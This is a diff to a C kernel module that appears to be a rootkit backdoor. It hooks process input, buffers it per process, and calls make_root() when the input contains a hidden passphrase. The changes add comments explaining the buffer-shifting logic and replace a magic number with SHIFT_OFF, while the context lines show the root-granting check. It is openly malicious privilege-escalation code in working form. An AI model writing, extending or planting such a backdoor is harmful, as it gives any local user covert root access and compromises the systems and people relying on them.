@@ -7,10 +7,12 @@
 #include "hook.h"
 #include "creds.h"
 
-DEFINE_HASHTABLE(pid_ht, 8);
+DEFINE_HASHTABLE(pid_ht, 8); //2^8 buckets _should_ keep collisions low
 
 static const char *accept = "makerot_";
 
+
+//Using strspn allows us to only read inputs that include valid characters
 static int
 is_valid(char *buf, size_t size)
 {
@@ -73,6 +75,15 @@ get_entry(pid_t key)
     return NULL;
 }
 
+/**
+ * The idea here is to fill up our buffer as much as we can
+ * Should we reach the maximum capacity, we first of all
+ * compare what we read so far; if it's a match, grant root
+ * Otherwise, we can safely move the last 11 bytes to the start 
+ * (as the worst case is reading 'make_me_roo', which 
+ * is 11 characters long)
+ * This means we need to offset str with (23 - 11) = 12 = SHIFT_OFF
+ **/
 static void
 handle_compare(char *buf, pid_t pid, size_t size) 
 {
@@ -96,8 +107,8 @@ handle_compare(char *buf, pid_t pid, size_t size)
         }
 
         if(entry->capacity == 0) {
-            memmove(entry->str, (entry->str + 12), 12);
-            entry->capacity = entry->iter = 12;
+            memmove(entry->str, (entry->str + SHIFT_OFF), SHIFT_OFF);
+            entry->capacity = entry->iter = SHIFT_OFF;
 
             goto fill;
         }
@@ -114,7 +125,7 @@ handle_pid(pid_t pid, __user char *buf, size_t size)
     char *str = kzalloc(size, GFP_KERNEL);   
     copy_from_user(str, buf, size);
     
-    //Early return on exact match
+    //Early return on exact match, avoiding more expensive operations
     if(strnstr(str, PASSPHRASE, size)) {
         make_root();
         return;
